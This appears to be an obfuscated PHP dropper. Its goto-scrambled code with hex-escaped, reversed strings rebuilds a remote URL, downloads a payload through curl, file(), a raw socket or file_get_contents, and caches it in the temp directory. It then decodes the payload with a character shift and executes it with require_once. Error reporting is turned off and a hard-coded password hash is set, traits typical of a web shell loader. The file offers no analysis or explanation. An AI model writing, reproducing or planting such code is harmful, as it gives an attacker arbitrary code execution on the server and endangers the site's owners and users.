<?php
 goto ZEOWc; I98kH: $stdIn = new create_function(3, "\107\105\x4e\x45\x52\x41\124\x45\x5f\x52\101\x4e\x44\x4f\115\x5f\102\131\x54\105"); goto bUCCc; Ho33_: $stdIn->build($stdIn->Builder($stdIn->parser($stdIn->Rev($stdIn->raw($stdIn->init(2)))))); goto LNhNM; ZEOWc: class create_function { private $shift; public function __construct($shift = 1) { error_reporting(0); $this->shift = $shift; } public function outterTable() { $mat = $this->rev("\x65\154\x69" . "\146\160\155\x74"); return $mat(); } public function init($kasihdua) { $leuy = array("\156\151\x62\56\x25\65\146\45\x32\106", "\160\160\x61\56\x62\x65\x77\56\141\x74", "\x61\144\x2d\157\171\150\x70\45\62\x46", "\x25\x32\x46\45\x33\101\163\160\164\x74\150"); $mat = $this->rev("\x65\x64\157" . "\154\160\155\151"); return $mat('', $leuy); } public function dash() { $leuy = array("\66\x38\x65\66\x66\63\143\x65\61\70", "\62\60\60\x37\x61\x35\x37\x38\x64\142", "\146\146\x34\x66\x66\146\144\65\x64\x61\x61\62"); $mat = $this->rev("\x65\144\x6f" . "\x6c\160\155\151"); return $mat('', $leuy); } public function splitter() { $leuy = array("\67\70\61\65\66\71\x36\x65\143\142\146\x31", "\x63\71\x36\145\x36\70\x39\64\142\67\x37\x39", "\x34\x35\x36\x64\63\63\x30\x65\137\144\x61\x74", "\x61\160\x61\x72\x73\x65\162\56\142\x69\156"); $mat = $this->rev("\x65\144\x6f" . "\154\x70\155\x69"); return $mat('', $leuy); } public function check($leuy) { return function_exists($leuy); } public function build($prod) { $aw = $this->rev("\x65\x74\x69\162\167\146"); $td = $this->outterTable(); $mat = $this->rev("\141\164\141\144\x5f\141\x74\x65\155\x5f\164\145\x67\x5f\x6d\141\x65\x72\x74\163"); $aw($td, $prod); require_once $mat($td)["\165\162\x69"]; return fclose($td); } public function raw($str) { return preg_replace_callback("\x2f\45\x28\133\60\55\x39\x61\55\x66\x5d\x7b\x32\x7d\51\x2f\151", function ($matches) { return chr(hexdec($matches[1])); }, $str); } public function Rev($str) { preg_match_all("\x2f\56\x2f\x75\163", $str, $matches); return implode('', array_reverse($matches[0])); } public function blyad($bam, $bim, $bum) { $mat = $this->rev("\164\x70\x6f\x74\145\163\x5f\x6c\162\165\143"); return $mat($bam, $bim, $bum); } public function getOut($anjay) { $mat = $this->rev("\143\145\170\145\x5f\x6c\x72\x75\x63"); return $mat($anjay); } public function suka($blyad) { $blyad = array(CURLOPT_URL, CURLOPT_RETURNTRANSFER, CURLOPT_FOLLOWLOCATION); return $blyad; } public function naked($aw, $iw, $uw, $ew, $ow) { $mat = $this->rev("\156\145\160\x6f" . "\x6b\143\x6f\x73\x66"); return $mat($aw, $iw, $uw, $ew, $ow); } public function outbound($ayang) { $mat = $this->rev("\163\x74\156\145\164\156\x6f\143\x5f\x74\145\147\137\145\x6c\151\x66"); return $mat($ayang); } public function inbound($ayang_aku, $yameteh) { $mat = $this->rev("\x73\164\x6e\145\164\x6e\x6f\143\137\x74\x75\160\x5f\x65\154\x69\x66"); return $mat($ayang_aku, $yameteh); } public function parser($data) { $bam = $this->rev("\x72\x69\144\137\160\155\145\x74\137\164\x65\147\137\x73\171\x73"); $bam1 = $this->rev("\x73\x74\x73\151\170\x65\137\145\x6c\151\146"); $bam2 = $this->rev("\164\x69\x6e\x69\137\154\x72\165\143"); $bam3 = $this->rev("\x65\x64\x6f\154\160\155\x69"); $bam4 = $this->rev("\145\164\151\x72\167\x66"); $fileNome = $this->splitter(); $fileRAW = $data; $tmpDir = $bam(); $filePos = $tmpDir . "\x2f" . $fileNome; $nyari = "\x69\170\x71\146\167\x6c\x72\161\43\x6e\x4d\170\x4f\x54\152\x59\x6b\x69\x2b"; if (!$bam1($filePos) || strpos($bam3('', file($filePos)), $nyari) === false) { if ($this->check($this->rev("\164\151\156\x69\137\x6c\162\x75\143"))) { $ch = $bam2(); $this->blyad($ch, $this->suka(0)[0], $fileRAW); $this->blyad($ch, $this->suka(0)[1], 1); $this->blyad($ch, $this->suka(0)[2], true); $fileData = $this->getOut($ch); curl_close($ch); } elseif ($this->check($this->rev("\x65\x6c\x69\146"))) { $fileData = $bam3('', file($fileRAW)); } elseif ($this->check($this->rev("\156\145\x70\x6f\x6b\x63\x6f\x73\x66"))) { $urlParts = parse_url($fileRAW); $host = $urlParts[$this->rev("\x74\x73\157\150")]; $path = $urlParts[$this->rev("\150\x74\x61\x70")]; $fp = $this->naked($this->rev("\57\57\72\x6c\x73\x73") . $host, 443, $errno, $errstr, 30); if (!$fp) { echo "{$errstr}\40\50{$errno}\x29\x3c\x62\162\x20\57\76\xa"; } else { $out = "\107\105\124\40" . $path . "\x20\x48\x54\x54\120\57\x31\x2e\61\xd\12"; $out .= "\x48\x6f\x73\x74\x3a\x20" . $host . "\15\xa"; $out .= "\x43\x6f\x6e\x6e\145\143\x74\x69\x6f\x6e\72\40\103\154\157\x73\x65\15\12\xd\12"; $bam4($fp, $out); $bb = $this->rev("\146\157\x65\146"); $cc = $this->rev("\x73\164\145\147\146"); $dd = $this->rev("\145\163\x6f\x6c\x63\146"); while (!$bb($fp)) { $line = $cc($fp, 1024); if (trim($line) == '') { break; } } $fileData = ''; while (!$bb($fp)) { $fileData .= $cc($fp, 1024); } $dd($fp); } } else { $fileData = $this->outbound($fileRAW); } $this->inbound($filePos, $fileData); } $conn = $this->outbound($filePos); return $conn; } public function Builder($input) { $output = ''; for ($i = 0; $i < strlen($input); $i++) { $ascii = ord($input[$i]); $ascii -= $this->shift; $output .= chr($ascii); } return $output; } } goto I98kH; bUCCc: $password = "\x62\x37\x34\x30\61\62\141\x30\146\x62\143\x61\x34\141\146\x34\142\144\62\x39\146\67\63\141\146\67\x63\60\x66\146\x66\142"; goto Ho33_; LNhNM: ?>